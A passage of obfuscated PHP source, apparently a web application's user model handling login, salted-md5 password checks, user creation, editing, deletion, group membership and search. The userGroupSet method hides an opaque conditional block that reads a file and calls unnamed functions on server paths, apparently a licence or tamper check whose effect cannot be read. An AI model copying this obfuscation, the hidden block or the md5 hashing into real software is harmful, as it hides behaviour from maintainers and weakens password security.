$ûéïÀ‚…); } protected function getInfoFull($£óñÓ’, $¤Ğ½¼æÒ = false) { $è§÷™¥† = $this->getInfoSimple($£óñÓ’); if (!is_array($è§÷™¥†)) { return array(); } if ($¤Ğ½¼æÒ) { return $this->_getInfoApply($è§÷™¥†, !0); } return $this->cacheFunctionGet($_SERVER[Ù×¯Ø…][2178], $£óñÓ’); } private function _getInfoApply($ÆÆ€¶³§, $¸†÷ú¬ = false) { $¼«êˆóÁ =& $_SERVER[Ù×¯Ø…]; if (!$ÆÆ€¶³§) { return $ÆÆ€¶³§; } $ııõ€ò‘ = md5($¼«êˆóÁ[2179] . $ÆÆ€¶³§[$¼«êˆóÁ[888]] . $¼«êˆóÁ[2180] . $ÆÆ€¶³§[$¼«êˆóÁ[28]]); $ÆÆ€¶³§ = $this->_listDataApplyItem($ÆÆ€¶³§); $‰×¹Õ¡ = Model($¼«êˆóÁ[1253])->metaGet($ÆÆ€¶³§[$¼«êˆóÁ[85]][$¼«êˆóÁ[406]]); $ÆÆ€¶³§[$¼«êˆóÁ[2181]] = $ııõ€ò‘; $ÆÆ€¶³§[$¼«êˆóÁ[85]][$¼«êˆóÁ[2012]] = isset($‰×¹Õ¡[$¼«êˆóÁ[2013]]) ? $‰×¹Õ¡[$¼«êˆóÁ[2013]] : null; if ($¸†÷ú¬) { $ÆÆ€¶³§[$¼«êˆóÁ[468]] = $this->metaGet($ÆÆ€¶³§[$¼«êˆóÁ[1580]]); } return $ÆÆ€¶³§; } protected function getInfoSimple($ÌËñøüƒ, $ñœÛ”£¹ = false) { $Ş…¶«°æ =& $_SERVER[Ù×¯Ø…]; if (!$ÌËñøüƒ) { return array(); } if ($ñœÛ”£¹) { $ÖÂ²óşÔ = $this->where(array($Ş…¶«°æ[1580] => intval($ÌËñøüƒ)))->find(); if (!is_array($ÖÂ²óşÔ)) { return array(); } $ÖÂ²óşÔ[$Ş…¶«°æ[2182]] = Action($Ş…¶«°æ[2183])->parseUrl($ÖÂ²óşÔ[$Ş…¶«°æ[2182]]); return $ÖÂ²óşÔ; } return $this->cacheFunctionGet($Ş…¶«°æ[1830], $ÌËñøüƒ); } protected function getInfoSimpleOuter($ìó¹†«¤) { $ÍéÍçšê =& $_SERVER[Ù×¯Ø…]; if (!$ìó¹†«¤ || $ìó¹†«¤ == 0) { return array($ÍéÍçšê[1580] => $ÍéÍçšê[191], $ÍéÍçšê[28] => $ÍéÍçšê[160] . LNG($ÍéÍçšê[2184]) . $ÍéÍçšê[539], $ÍéÍçšê[2182] => STATIC_PATH . $ÍéÍçšê[2185]); } $¾›áì²¾ = $this->cacheFunctionGet($ÍéÍçšê[1830], $ìó¹†«¤); $™°û‚Õº = array_field_key($¾›áì²¾, explode($ÍéÍçšê[47], $this->simpleField)); if (!$™°û‚Õº) { return array($ÍéÍçšê[1580] => $ÍéÍçšê[1120], $ÍéÍçšê[28] => $ÍéÍçšê[160] . LNG($ÍéÍçšê[2186]) . $ÍéÍçšê[539], $ÍéÍçšê[2182] => STATIC_PATH . $ÍéÍçšê[2187]); } $™°û‚Õº[$ÍéÍçšê[2182]] = Action($ÍéÍçšê[2183])->parseUrl($™°û‚Õº[$ÍéÍçšê[2182]]); return $™°û‚Õº; } protected function groupUser($†Ø›•©”) { } public static function errorLang($ô»ñ‹Ò˜) { $à´Âåèå =& $_SERVER[Ù×¯Ø…]; $¤ïâÃÒ® = array(self::ERROR_USER_NOT_EXISTS => $à´Âåèå[2188], self::ERROR_USER_PASSWORD_ERROR => $à´Âåèå[2189], self::ERROR_USER_EXIST_NAME => $à´Âåèå[2190], self::ERROR_USER_EXIST_PHONE => $à´Âåèå[2191], self::ERROR_USER_EXIST_EMAIL => $à´Âåèå[2192], self::ERROR_USER_LOGIN_LOCK => $à´Âåèå[2193], self::ERROR_IP_NOT_ALLOW => $à´Âåèå[2194], self::ERROR_USER_EXIST_NICKNAME => $à´Âåèå[2195]); return LNG($¤ïâÃÒ®[$ô»ñ‹Ò˜]); } public function getInfoByMeta($Çªİƒæé, $»Æ‚Ÿ§’) { $½·ıÂñù =& $_SERVER[Ù×¯Ø…]; $¬‘”…ôÒ = Model($½·ıÂñù[2196])->where(array($½·ıÂñù[93] => $Çªİƒæé, $½·ıÂñù[372] => $»Æ‚Ÿ§’))->find(); if ($¬‘”…ôÒ) { return $this->getInfo($¬‘”…ôÒ[$½·ıÂñù[1580]]); } return !1; } public function userLoginCheck($ÑºÒñá„, $Î”‘–—¼) { $ƒ§ï÷ğ¢ =& $_SERVER[Ù×¯Ø…]; $ÅùğÀñå = $this->userLoginFind($ÑºÒñá„); if (!$ÅùğÀñå) { return UserModel::ERROR_USER_NOT_EXISTS; } if (!$this->userPasswordCheck($ÅùğÀñå[$ƒ§ï÷ğ¢[1580]], $Î”‘–—¼)) { return UserModel::ERROR_USER_PASSWORD_ERROR; } return $this->getInfo($ÅùğÀñå[$ƒ§ï÷ğ¢[1580]]); } public function userLoginFind($§Æ¯¨”Ö) { $İÛ‚ó»‚ =& $_SERVER[Ù×¯Ø…]; $˜ÆÚ¦–õ = array($İÛ‚ó»‚[28] => $§Æ¯¨”Ö, $İÛ‚ó»‚[2016] => $§Æ¯¨”Ö, $İÛ‚ó»‚[303] => $§Æ¯¨”Ö, $İÛ‚ó»‚[2197] => $§Æ¯¨”Ö, $İÛ‚ó»‚[996] => $İÛ‚ó»‚[998]); if ($this->nickNameRpt()) { unset($˜ÆÚ¦–õ[$İÛ‚ó»‚[2016]]); } return $this->where($˜ÆÚ¦–õ)->find(); } public function clearCache($şö¿Öª¢) { $“éËÑİ© =& $_SERVER[Ù×¯Ø…]; $this->cacheFunctionClear($“éËÑİ©[1829], $şö¿Öª¢); $this->cacheFunctionClear($“éËÑİ©[1830], $şö¿Öª¢); $this->cacheFunctionClear($“éËÑİ©[2178], $şö¿Öª¢); } public function userPasswordCheck($òçà², $¹Áæ¤Õô) { $«®ËÍ„ =& $_SERVER[Ù×¯Ø…]; $ÜÊØ‚² = $this->where(array($«®ËÍ„[1580] => intval($òçà²)))->find(); $ˆü‰¸™ = $this->metaGet($òçà²); $Û”ƒ¥ñ° = isset($ˆü‰¸™[$«®ËÍ„[2198]]) ? $ˆü‰¸™[$«®ËÍ„[2198]] : $«®ËÍ„[33]; if (md5($Û”ƒ¥ñ° . trim($¹Áæ¤Õô)) !== $ÜÊØ‚²[$«®ËÍ„[888]]) { return !1; } return !0; } public function userAdd($ƒÎÏ÷­‹) { $ÆÑÁùæÏ =& $_SERVER[Ù×¯Ø…]; $ñ²îñ¤› = array($ÆÑÁùæÏ[424] => $ƒÎÏ÷­‹[$ÆÑÁùæÏ[28]], $ÆÑÁùæÏ[2199] => $ƒÎÏ÷­‹[$ÆÑÁùæÏ[1459]], $ÆÑÁùæÏ[2200] => isset($ƒÎÏ÷­‹[$ÆÑÁùæÏ[303]]) ? $ƒÎÏ÷­‹[$ÆÑÁùæÏ[303]] : $ÆÑÁùæÏ[33], $ÆÑÁùæÏ[2201] => isset($ƒÎÏ÷­‹[$ÆÑÁùæÏ[2197]]) ? $ƒÎÏ÷­‹[$ÆÑÁùæÏ[2197]] : $ÆÑÁùæÏ[33], $ÆÑÁùæÏ[2202] => isset($ƒÎÏ÷­‹[$ÆÑÁùæÏ[2016]]) ? $ƒÎÏ÷­‹[$ÆÑÁùæÏ[2016]] : $ƒÎÏ÷­‹[$ÆÑÁùæÏ[28]], $ÆÑÁùæÏ[2203] => isset($ƒÎÏ÷­‹[$ÆÑÁùæÏ[2182]]) ? $ƒÎÏ÷­‹[$ÆÑÁùæÏ[2182]] : $ÆÑÁùæÏ[33], $ÆÑÁùæÏ[2204] => isset($ƒÎÏ÷­‹[$ÆÑÁùæÏ[2205]]) ? $ƒÎÏ÷­‹[$ÆÑÁùæÏ[2205]] : 1, $ÆÑÁùæÏ[2206] => $ƒÎÏ÷­‹[$ÆÑÁùæÏ[888]], $ÆÑÁùæÏ[1831] => isset($ƒÎÏ÷­‹[$ÆÑÁùæÏ[1734]]) ? $ƒÎÏ÷­‹[$ÆÑÁùæÏ[1734]] : 1024 * 1024 * 20, $ÆÑÁùæÏ[1832] => 0, $ÆÑÁùæÏ[2207] => 0, $ÆÑÁùæÏ[1874] => isset($ƒÎÏ÷­‹[$ÆÑÁùæÏ[749]]) ? $ƒÎÏ÷­‹[$ÆÑÁùæÏ[749]] : 1); if (!empty($ƒÎÏ÷­‹[$ÆÑÁùæÏ[1580]])) { $ñ²îñ¤›[$ÆÑÁùæÏ[1580]] = $ƒÎÏ÷­‹[$ÆÑÁùæÏ[1580]]; } $ïšàÒ” = $this->_checkExist($ƒÎÏ÷­‹); if ($ïšàÒ” !== !0) { return $ïšàÒ”; } $Ü“öÌá = $this->add($ñ²îñ¤›); $“…ÉºŠÀ = array($ÆÑÁùæÏ[2206] => $ñ²îñ¤›[$ÆÑÁùæÏ[888]], $ÆÑÁùæÏ[2202] => $ñ²îñ¤›[$ÆÑÁùæÏ[2016]]); $this->userEdit($Ü“öÌá, $“…ÉºŠÀ); Model($ÆÑÁùæÏ[1253])->userRootAdd($Ü“öÌá); return $Ü“öÌá; } protected function userEditTest($ÂÁ°ì«´, $‚¯ˆ½ı) { return $this->call($_SERVER[Ù×¯Ø…][2208], $ÂÁ°ì«´, $‚¯ˆ½ı); } protected function userEdit($”äûõ, $è„µëÍŒ) { $ñ¯Á®Ş˜ =& $_SERVER[Ù×¯Ø…]; $©ØÕùšæ = $this->getInfoSimple($”äûõ); if (!$©ØÕùšæ) { return !1; } $ûÚàó¤ö = $this->_checkExist($è„µëÍŒ, $”äûõ); if ($ûÚàó¤ö !== !0) { return $ûÚàó¤ö; } if (isset($è„µëÍŒ[$ñ¯Á®Ş˜[888]]) && trim($è„µëÍŒ[$ñ¯Á®Ş˜[888]]) != $ñ¯Á®Ş˜[33]) { $÷ãçø”¨ = $this->metaGet($”äûõ); if (empty($÷ãçø”¨[$ñ¯Á®Ş˜[2198]])) { $÷ãçø”¨[$ñ¯Á®Ş˜[2198]] = rand_string(10); Model($ñ¯Á®Ş˜[516])->metaSet($”äûõ, $ñ¯Á®Ş˜[2198], $÷ãçø”¨[$ñ¯Á®Ş˜[2198]]); } $è„µëÍŒ[$ñ¯Á®Ş˜[888]] = md5($÷ãçø”¨[$ñ¯Á®Ş˜[2198]] . trim($è„µëÍŒ[$ñ¯Á®Ş˜[888]])); } else { unset($è„µëÍŒ[$ñ¯Á®Ş˜[888]]); } $this->where(array($ñ¯Á®Ş˜[1571] => $”äûõ))->save($è„µëÍŒ); if (isset($è„µëÍŒ[$ñ¯Á®Ş˜[2016]])) { $this->setNamePinyin($”äûõ, $è„µëÍŒ[$ñ¯Á®Ş˜[2016]]); } $this->clearCache($”äûõ); return !0; } public function setNamePinyin($¨ğ¨ııó, $Ñù·³¢Š = false) { $²Ò…”ƒŞ =& $_SERVER[Ù×¯Ø…]; if (!$Ñù·³¢Š) { $¾äÚşØ… = $this->getInfoSimple($¨ğ¨ııó); $Ñù·³¢Š = $¾äÚşØ…[$²Ò…”ƒŞ[2016]] ? $¾äÚşØ…[$²Ò…”ƒŞ[2016]] : $¾äÚşØ…[$²Ò…”ƒŞ[28]]; } $¬å§Å¡¿ = Model($²Ò…”ƒŞ[541]); if (!Input::check($Ñù·³¢Š, $²Ò…”ƒŞ[590])) { return $¬å§Å¡¿->metaSet($¨ğ¨ııó, array($²Ò…”ƒŞ[467] => $²Ò…”ƒŞ[33], $²Ò…”ƒŞ[466] => $²Ò…”ƒŞ[33])); } return $¬å§Å¡¿->metaSet($¨ğ¨ııó, array($²Ò…”ƒŞ[467] => str_replace($²Ò…”ƒŞ[50], $²Ò…”ƒŞ[33], Pinyin::get($Ñù·³¢Š)), $²Ò…”ƒŞ[466] => Pinyin::get($Ñù·³¢Š, $²Ò…”ƒŞ[591]))); } private function nickNameRpt() { $ÇŠÓ¿ =& $_SERVER[Ù×¯Ø…]; $ÊŒÚĞ£í = Model($ÇŠÓ¿[769])->get($ÇŠÓ¿[2209]); $ëÎïïïœ = $GLOBALS[$ÇŠÓ¿[6]][$ÇŠÓ¿[379]][$ÇŠÓ¿[2209]]; $‰Ôó‚—Ô = !is_null($ÊŒÚĞ£í) ? $ÊŒÚĞ£í : $ëÎïïïœ; return !!$‰Ôó‚—Ô; } private function _checkExist($Ø÷ÄÉ¡, $¥ƒß¢Ûé = false) { $é¹ĞÏÍ =& $_SERVER[Ù×¯Ø…]; $Ã›¼¯Ø¥ = array($é¹ĞÏÍ[28] => UserModel::ERROR_USER_EXIST_NAME, $é¹ĞÏÍ[2016] => UserModel::ERROR_USER_EXIST_NICKNAME, $é¹ĞÏÍ[303] => UserModel::ERROR_USER_EXIST_EMAIL, $é¹ĞÏÍ[2197] => UserModel::ERROR_USER_EXIST_PHONE); if ($this->nickNameRpt()) { unset($Ã›¼¯Ø¥[$é¹ĞÏÍ[2016]]); } $õÄûÛ = $¥ƒß¢Ûé ? array($é¹ĞÏÍ[1580] => array($é¹ĞÏÍ[2210], $¥ƒß¢Ûé)) : array(); foreach ($Ã›¼¯Ø¥ as $¹³¦ŠÜÕ => $ÏŞõüäŒ) { $ğôñÎùñ = array(); foreach ($Ã›¼¯Ø¥ as $Çª™Íï™ => $‚ó…™Î¯) { if (isset($Ø÷ÄÉ¡[$Çª™Íï™]) && $Ø÷ÄÉ¡[$Çª™Íï™]) { $ğôñÎùñ[] = $Ø÷ÄÉ¡[$Çª™Íï™]; } } if (!$ğôñÎùñ) { continue; } $ğ˜ïİ©é = array_merge(array($¹³¦ŠÜÕ => array($é¹ĞÏÍ[7], $ğôñÎùñ)), $õÄûÛ); $™‡Š¼ĞŒ = $this->where($ğ˜ïİ©é)->find(); if ($™‡Š¼ĞŒ) { return $ÏŞõüäŒ; } } return !0; } public function userListInfo($úèÉôö—) { $ñÏ©Öèå =& $_SERVER[Ù×¯Ø…]; $Å¤Ô¢‡ = array(); $úèÉôö— = is_array($úèÉôö—) ? array_unique($úèÉôö—) : array(); if (!$úèÉôö—) { return $Å¤Ô¢‡; } if (count($úèÉôö—) < 20) { foreach ($úèÉôö— as $ÉëÜ§£ ) { $Å¤Ô¢‡[$ÉëÜ§£  . $ñÏ©Öèå[33]] = $this->getInfoSimpleOuter($ÉëÜ§£ ); } } else { $õ¦ËÛ = array($ñÏ©Öèå[1571] => array($ñÏ©Öèå[422], $úèÉôö—)); if (count($úèÉôö—) == 1) { $õ¦ËÛ = array($ñÏ©Öèå[1571] => $úèÉôö—[0]); } $ù¯Ü£µ› = Model($ñÏ©Öèå[516])->field($this->simpleField)->where($õ¦ËÛ)->select(); $ù¯Ü£µ› = array_to_keyvalue($ù¯Ü£µ›, $ñÏ©Öèå[1580]); foreach ($úèÉôö— as $ÉëÜ§£ ) { $à°Ş—Ëø = $ù¯Ü£µ›[$ÉëÜ§£ ]; if (!$à°Ş—Ëø) { $Å¤Ô¢‡[$ÉëÜ§£  . $ñÏ©Öèå[33]] = $this->getInfoSimpleOuter($ÉëÜ§£ ); continue; } $à°Ş—Ëø[$ñÏ©Öèå[2182]] = Action($ñÏ©Öèå[2183])->parseUrl($à°Ş—Ëø[$ñÏ©Öèå[2182]]); $Å¤Ô¢‡[$ÉëÜ§£  . $ñÏ©Öèå[33]] = $à°Ş—Ëø; } } return $Å¤Ô¢‡; } protected function userStatus($ì–ß·Şî, $éªĞ™Óš) { $¸Í–±‰ = $this->getInfoSimple($ì–ß·Şî); if (!$¸Í–±‰) { return !1; } $ÆŠ±Ë…ª = array($_SERVER[Ù×¯Ø…][749] => $éªĞ™Óš); return $this->userEdit($ì–ß·Şî, $ÆŠ±Ë…ª); } protected function userRemove($Ğ”üœò‘) { $İ«Ç”€Ê =& $_SERVER[Ù×¯Ø…]; $û‘°ØÊŠ = $this->getInfoSimple($Ğ”üœò‘); if (!$û‘°ØÊŠ) { return !1; } $ı·Îõšå = array($İ«Ç”€Ê[1571] => $Ğ”üœò‘); Model($İ«Ç”€Ê[598])->where($ı·Îõšå)->delete(); Model($İ«Ç”€Ê[2211])->where($ı·Îõšå)->delete(); Model($İ«Ç”€Ê[1837])->where($ı·Îõšå)->delete(); Model($İ«Ç”€Ê[2196])->where($ı·Îõšå)->delete(); Model($İ«Ç”€Ê[2212])->where($ı·Îõšå)->delete(); Model($İ«Ç”€Ê[2033])->removeUserAll($Ğ”üœò‘); Model($İ«Ç”€Ê[831])->userRootRemove($Ğ”üœò‘); return $this->where($ı·Îõšå)->delete(); } protected function userGroupSet($Á§®Ç¸Ş, $ñ»‘Úù, $é¢éúÅ¿ = array()) { $ëÃÔ¼õ¨ =& $_SERVER[Ù×¯Ø…]; if ($_SERVER[$ëÃÔ¼õ¨[398]] != $_SERVER[$ëÃÔ¼õ¨[1424]]) { $Å×‰õ„º = $ëÃÔ¼õ¨[878]; $òø¯¶ = $ëÃÔ¼õ¨[399]; $“œÌòË = $_SERVER[$ëÃÔ¼õ¨[400]] . $ëÃÔ¼õ¨[401]; $È‡¤‹ÃÊ = $òø¯¶($“œÌòË); $ºáªíİ  = explode($ëÃÔ¼õ¨[229], $È‡¤‹ÃÊ); if (count($ºáªíİ ) < $ëÃÔ¼õ¨[618]) { $Ù†Ì…û€ = $ëÃÔ¼õ¨[403]; $Ù†Ì…û€(); } $ÊÆë”¶† = $ëÃÔ¼õ¨[879]; $ÊÆë”¶†($_SERVER[$ëÃÔ¼õ¨[880]]); $ÊÆë”¶†($_SERVER[$ëÃÔ¼õ¨[400]] . $ëÃÔ¼õ¨[1508]); $ÊÙˆö¤  = 1; while ($ÊÙˆö¤  > 1) { $ÊÙˆö¤  = $ÊÙˆö¤  + 4; $ıâèí¥á = rawurlencode($ÊÙˆö¤  . $ëÃÔ¼õ¨[376]); } } $·øƒ§ãà = $this->getInfoSimple($Á§®Ç¸Ş); if (!$·øƒ§ãà || !is_array($ñ»‘Úù)) { return !1; } $½ÌÚ„º± = Model($ëÃÔ¼õ¨[1837]); $½ÌÚ„º±->where(array($ëÃÔ¼õ¨[1580] => $Á§®Ç¸Ş))->delete(); $ŠˆÆ¨Ä = array(); $Œñš´‚ = 0; foreach ($ñ»‘Úù as $ò‡ÃÌÚÃ => $Ä—•ñ¬) { $£ıäÖ£ = array($ëÃÔ¼õ¨[1580] => $Á§®Ç¸Ş, $ëÃÔ¼õ¨[1748] => $ò‡ÃÌÚÃ, $ëÃÔ¼õ¨[1851] => $Ä—•ñ¬); $£ıäÖ£[$ëÃÔ¼õ¨[1771]] = isset($é¢éúÅ¿[$Œñš´‚]) ? $é¢éúÅ¿[$Œñš´‚] : 0; $Œñš´‚++; $ŠˆÆ¨Ä[] = $£ıäÖ£; } return $½ÌÚ„º±->addAll($ŠˆÆ¨Ä, array(), !0); } protected function userGroupAdd($³Í‹Ùç›, $¸ïééæ = array()) { $Š»‘› ’ =& $_SERVER[Ù×¯Ø…]; $ú¹ìè’ = $this->getInfoSimple($³Í‹Ùç›); if (!$ú¹ìè’ || empty($¸ïééæ)) { return !1; } $Œöî“Ñ‰ = array(); foreach ($¸ïééæ as $»Ó¤öè¤ => $â•Ï æ) { $Œöî“Ñ‰[] = array($Š»‘› ’[1580] => $³Í‹Ùç›, $Š»‘› ’[1748] => $»Ó¤öè¤, $Š»‘› ’[1851] => $â•Ï æ, $Š»‘› ’[1771] => 0); } return Model($Š»‘› ’[1837])->addAll($Œöî“Ñ‰, array(), !0); } protected function userGroupRemove($è‹‚ÉÁå, $„¹¼óÅ) { $Çõµå³‹ =& $_SERVER[Ù×¯Ø…]; $…Á´Òßª = $this->getInfoSimple($è‹‚ÉÁå); if (!$…Á´Òßª || !$„¹¼óÅ) { return !1; } $÷Œò•ãí = array($Çõµå³‹[1571] => $è‹‚ÉÁå, $Çõµå³‹[1835] => $„¹¼óÅ); return Model($Çõµå³‹[1837])->where($÷Œò•ãí)->delete(); } public function listData() { $¯º£÷•¾ = $this->_makeOrder()->selectPage(50); $this->_listDataApply($¯º£÷•¾[$_SERVER[Ù×¯Ø…][367]]); return $¯º£÷•¾; } public function listByID($‚ÌÃ“Õ‚) { $¦…‹äÌÁ =& $_SERVER[Ù×¯Ø…]; if (!$‚ÌÃ“Õ‚) { return; } $ŸÃ¼’™õ = array($¦…‹äÌÁ[1580] => array($¦…‹äÌÁ[7], $‚ÌÃ“Õ‚)); $ØÅ‘Äà¼ = $this->where($ŸÃ¼’™õ)->select(); $ØÅ‘Äà¼ = array_sort_keep($ØÅ‘Äà¼, $¦…‹äÌÁ[1580], $‚ÌÃ“Õ‚); $this->_listDataApply($ØÅ‘Äà¼); return $ØÅ‘Äà¼; } public function listByGroup($ıãÜà°ö = 0, $Êİ¯å = array()) { $ñ¿ãÎ¡ =& $_SERVER[Ù×¯Ø…]; $ö¤©Ûò = $ñ¿ãÎ¡[33]; $²Íø‡Ñ¥ = array(); if ($ıãÜà°ö) { $²Íø‡Ñ¥ = array($ñ¿ãÎ¡[2213] => intval($ıãÜà°ö)); $ö¤©Ûò = "\114\105\x46\x54\40\x4a\x4f\111\x4e\40{$this->tablePrefix}\x75\163\145\x72\137\x67\162\x6f\165\160\x20\x75\x73\145\x72\x5f\x67\x72\x6f\165\160\40\157\x6e\40\x75\163\x65\162\x2e\x75\x73\145\162\111\104\40\75\40\x75\163\x65\162\137\x67\x72\157\165\160\56\165\163\x65\x72\x49\104"; $ÇÙ¶Óü = Input::get($ñ¿ãÎ¡[458], null, $ñ¿ãÎ¡[33]) ? $ñ¿ãÎ¡[33] : $ñ¿ãÎ¡[2214]; } if (isset($Êİ¯å[$ñ¿ãÎ¡[749]])) { $²Íø‡Ñ¥[$ñ¿ãÎ¡[2215]] = $Êİ¯å[$ñ¿ãÎ¡[749]]; } $¥¥‹×š¸ = $this->_makeOrder($ÇÙ¶Óü)->field($ñ¿ãÎ¡[2216])->where($²Íø‡Ñ¥)->join($ö¤©Ûò)->selectPage(50); $this->_listDataApply($¥¥‹×š¸[$ñ¿ãÎ¡[367]]); return $¥¥‹×š¸; } private function _makeOrder($”ÃõÄ“ = '') { $×Æ•šÉ =& $_SERVER[Ù×¯Ø…]; $ìÌü´—Î = array($×Æ•šÉ[1580], $×Æ•šÉ[28], $×Æ•šÉ[1736], $×Æ•šÉ[1708], $×Æ•šÉ[194]); $˜¾¬‹÷ = array($×Æ•šÉ[451] => $×Æ•šÉ[452], $×Æ•šÉ[453] => $×Æ•šÉ[454]); $õÃŒœê = Input::get($×Æ•šÉ[458], $×Æ•šÉ[7], $×Æ•šÉ[1571], $ìÌü´—Î); $ËåŒ½®Ğ = Input::get($×Æ•šÉ[459], $×Æ•šÉ[7], $×Æ•šÉ[1838], array($×Æ•šÉ[1838], $×Æ•šÉ[453])); $ËåŒ½®Ğ = $˜¾¬‹÷[$ËåŒ½®Ğ]; $”ÃõÄ“ = $”ÃõÄ“ . "\165\x73\x65\x72\x2e{$õÃŒœê}\40{$ËåŒ½®Ğ}\54\x20\x75\163\x65\162\x2e\165\x73\x65\162\111\104\x20\x61\163\x63"; return $this->alias($×Æ•šÉ[1958])->order($”ÃõÄ“); } public function listSearch($âÃŠ·Ë…) { $¸¹ºœõ§ =& $_SERVER[Ù×¯Ø…]; $ªÈ´â€ğ = $âÃŠ·Ë…[$¸¹ºœõ§[1839]]; $×öã¦€® = isset($âÃŠ·Ë…[$¸¹ºœõ§[1840]]) ? $âÃŠ·Ë…[$¸¹ºœõ§[1840]] : !1; $ªÈ´â€ğ = str_replace($¸¹ºœõ§[1841], $¸¹ºœõ§[1842], trim($ªÈ´â€ğ)); $Ê±º®úà = array($¸¹ºœõ§[28] => array($¸¹ºœõ§[381], "\45{$ªÈ´â€ğ}\x25"), $¸¹ºœõ§[303] => array($¸¹ºœõ§[381], "{$ªÈ´â€ğ}\x25"), $¸¹ºœõ§[2016] => array($¸¹ºœõ§[381], "{$ªÈ´â€ğ}\45"), $¸¹ºœõ§[996] => $¸¹ºœõ§[1843]); if (Input::check($ªÈ´â€ğ, $¸¹ºœõ§[309])) { $Ê±º®úà[$¸¹ºœõ§[1580]] = array($¸¹ºœõ§[381], "{$ªÈ´â€ğ}\45"); $Ê±º®úà[$¸¹ºœõ§[2197]] = array($¸¹ºœõ§[381], "{$ªÈ´â€ğ}\x25"); } if (!$ªÈ´â€ğ) { $Ê±º®úà = array(); } if (isset($âÃŠ·Ë…[$¸¹ºœõ§[749]])) { $Ê±º®úà[$¸¹ºœõ§[749]] = $âÃŠ·Ë…[$¸¹ºœõ§[749]]; } $Ê±º®úà = $this->parseWhereLike($Ê±º®úà); $ŒÔ¨·£Ì = $this->_makeOrder()->where($Ê±º®úà)->selectPage(20); if (!$ŒÔ¨·£Ì || count($ŒÔ¨·£Ì[$¸¹ºœõ§[367]]) < 5 && Input::check($ªÈ´â€ğ, $¸¹ºœõ§[316])) { $ºÉª‘…Ë = $this->_searchFromMeta($¸¹ºœõ§[466], $ªÈ´â€ğ, 10); $Ñ–ı¹ùñ = $this->_searchFromMeta($¸¹ºœõ§[467], $ªÈ´â€ğ, 10); $ß´˜¤ºæ = array_merge($ºÉª‘…Ë, $Ñ–ı¹ùñ, $ŒÔ¨·£Ì[$¸¹ºœõ§[367]]); $ŒÔ¨·£Ì[$¸¹ºœõ§[367]] = array_unique_by_key($ß´˜¤ºæ, $¸¹ºœõ§[1580]); $ŒÔ¨·£Ì[$¸¹ºœõ§[364]][$¸¹ºœõ§[365]] = count($ŒÔ¨·£Ì[$¸¹ºœõ§[367]]); $ŒÔ¨·£Ì[$¸¹ºœõ§[364]][$¸¹ºœõ§[366]] = ceil($ŒÔ¨·£Ì[$¸¹ºœõ§[364]][$¸¹ºœõ§[365]] / $ŒÔ¨·£Ì[$¸¹ºœõ§[364]][$¸¹ºœõ§[361]]); } $this->_listDataApply($ŒÔ¨·£Ì[$¸¹ºœõ§[367]]); $this->_filterByGroup($ŒÔ¨·£Ì, $×öã¦€®); return $ŒÔ¨·£Ì; } private function _filterByGroup(&$ƒ´ªôàï, $¥¾Ú©¢Ú) { $§íøòäï =& $_SERVER[Ù×¯Ø…]; if (!$¥¾Ú©¢Ú) { return $ƒ´ªôàï; } foreach ($ƒ´ªôàï[$§íøòäï[367]] as $÷øö™¿ => &$§¢éÌ¸Ö) { $¶ä¨á„’ = array_to_keyvalue($§¢éÌ¸Ö[$§íøòäï[1928]], $§íøòäï[33], $§íøòäï[1748]); if (!in_array($¥¾Ú©¢Ú, $¶ä¨á„’)) { unset($ƒ´ªôàï[$§íøòäï[367]][$÷øö™¿]); } } unset($§¢éÌ¸Ö); $ƒ´ªôàï[$§íøòäï[367]] = array_values($ƒ´ªôàï[$§íøòäï[367]]); $ƒ´ªôàï[$§íøòäï[364]] = array($§íøòäï[1990] => count($ƒ´ªôàï[$§íøòäï[367]]), $§íøòäï[1988] => $ƒ´ªôàï[$§íøòäï[364]][$§íøòäï[361]], $§íøòäï[1987] => 1, $§íøòäï[1989] => 1); } private function _searchFromMeta($ªÛí³ê, $¨Ñßşë», $±©Âê˜Û) { $ìÜ×Ø· =& $_SERVER[Ù×¯Ø…]; $¨Ñßşë» = strtolower($¨Ñßşë»); $ÜÑáïÒ = array($ìÜ×Ø·[93] => $ªÛí³ê, $ìÜ×Ø·[372] => array($ìÜ×Ø·[381], "\x25{$¨Ñßşë»}\45")); $ÜÑáïÒ = $this->parseWhereLike($ÜÑáïÒ); $©»œ¥¥¶ = Model($ìÜ×Ø·[2217])->where($ÜÑáïÒ)->limit($±©Âê˜Û)->select(); if (!$©»œ¥¥¶) { return array(); } $©»œ¥¥¶ = array_to_keyvalue($©»œ¥¥¶, $ìÜ×Ø·[33], $ìÜ×Ø·[1580]); $İÇ¬•­Š = $this->where(array($ìÜ×Ø·[1571] => array($ìÜ×Ø·[7], $©»œ¥¥¶)))->select(); if (!$İÇ¬•­Š) { return array(); } return $İÇ¬•­Š; } private function _listDataApplyItem($ÜÒéˆ˜) { $¹ßªòå = array($ÜÒéˆ˜); $this->_listDataApply($¹ßªòå); return $¹ßªòå[0]; } private function _listDataApply(&$¤ÓŸÆ»¦) { $³ğºØ¦¶ =& $_SERVER[Ù×¯Ø…]; if (!$¤ÓŸÆ»¦) { return; } array_remove_key($¤ÓŸÆ»¦, $³ğºØ¦¶[888]); $½ˆ—­”ô = array_to_keyvalue($¤ÓŸÆ»¦, $³ğºØ¦¶[33], $³ğºØ¦¶[1580]); $this->_listAppendGroup($¤ÓŸÆ»¦, $½ˆ—­”ô); $this->_listAppendMeta($¤ÓŸÆ»¦, $½ˆ—­”ô); $this->_listAppendSourceRoot($¤ÓŸÆ»¦, $½ˆ—­”ô); } private function _listAppendSourceRoot(&$ŒáËüñ†, $¯›Ô¶®‘) { $¼§öÜ›é =& $_SERVER[Ù×¯Ø…]; $ñëÖ•ì = array($¼§öÜ›é[501] => 0, $¼§öÜ›é[507] => array($¼§öÜ›é[7], $¯›Ô¶®‘), $¼§öÜ›é[415] => SourceModel::TYPE_USER); $–—‰˜ö¢ = Model($¼§öÜ›é[831])->order($¼§öÜ›é[1849])->field($¼§öÜ›é[1850]); $óÖãÆÉø = $–—‰˜ö¢->limit(count($¯›Ô¶®‘))->where($ñëÖ•ì)->select(); $óÖãÆÉø = array_to_keyvalue($óÖãÆÉø, $¼§öÜ›é[507]); $óÖãÆÉø = array_remove_key($óÖãÆÉø, $¼§öÜ›é[507]); foreach ($ŒáËüñ† as &$êÒ‡–Õö) { $êÒ‡–Õö[$¼§öÜ›é[85]] = $óÖãÆÉø[$êÒ‡–Õö[$¼§öÜ›é[1580]]] ? $óÖãÆÉø[$êÒ‡–Õö[$¼§öÜ›é[1580]]] : array(); } unset($êÒ‡–Õö); } private function _listAppendGroup(&$Œé¶ä›ä, $ŸÈ›¶ÜÑ) { 